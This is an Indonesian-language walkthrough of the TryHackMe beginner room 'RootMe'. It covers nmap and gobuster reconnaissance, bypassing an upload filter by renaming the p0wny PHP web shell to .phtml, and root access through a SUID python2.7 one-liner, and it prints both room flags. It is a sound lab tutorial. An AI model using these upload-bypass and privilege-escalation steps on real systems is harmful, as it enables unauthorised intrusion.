<img width="700" height="700" alt="image" src="https://github.com/user-attachments/assets/fe7accb5-f40b-4e23-aed9-7500026de15a" />

Room Icon
RootMe
A ctf for beginners, can you root me?
https://tryhackme.com/room/rrootme

# RootMe - TryHackMe Walkthrough

Dokumentasi penyelesaian tantangan **RootMe** di TryHackMe. Room ini berfokus pada eksploitasi web (upload bypass) dan eskalasi hak akses menggunakan SUID bit pada Python.

## 1. Rekognisi (Scanning)
Langkah awal dilakukan dengan memindai target menggunakan `nmap` untuk melihat port yang terbuka.
- **Target IP:** `10.49.174.191`
- **Port Terbuka:**
  - `22/tcp` (SSH)
  - `80/tcp` (HTTP - Apache 2.4.41)

## 2. Enumerasi Web (Directory Busting)
Menggunakan `gobuster` untuk menemukan direktori tersembunyi pada server web.

```bash
gobuster dir -u http://10.49.174.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Hasil Utama:
/panel/ : Halaman untuk mengunggah file.
/uploads/ : Folder tempat file yang diunggah disimpan.

## 3. Mendapatkan Akses Awal (Gaining Shell)
Server memiliki filter keamanan yang memblokir ekstensi .php. Untuk melewatinya, saya menggunakan ekstensi .phtml.
Menyiapkan Web Shell (p0wny-shell).

```wget https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php```

Ganti Ekstensi
Agar server target menerima file ini, ganti ekstensinya menjadi .phtml:

```bash
mv shell.php shell.phtml
```
Mengunggah shell.phtml melalui halaman http://10.49.174.191.
Mengakses shell di http://10.49.174.191.
User Flag:

```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
# Output: THM{y0u_g0t_a_sh3ll}
```

## 4. Eskalasi Hak Akses (Privilege Escalation)
Mencari file dengan izin SUID untuk menemukan celah eskalasi.

```bash
find / -user root -perm /4000 2>/dev/null
```

```bash
cat /var/www/user.txt
```

Ditemukan file yang tidak lazim: /usr/bin/python2.7.
Karena Python memiliki bit SUID, saya dapat menjalankan kode Python dengan hak akses root. Saya menggunakan perintah berikut untuk langsung membaca flag root:

```bash
python -c 'print(open("/root/root.txt").read())'
```

Root Flag:
Flag: THM{pr1v1l3g3_3sc4l4t10n}
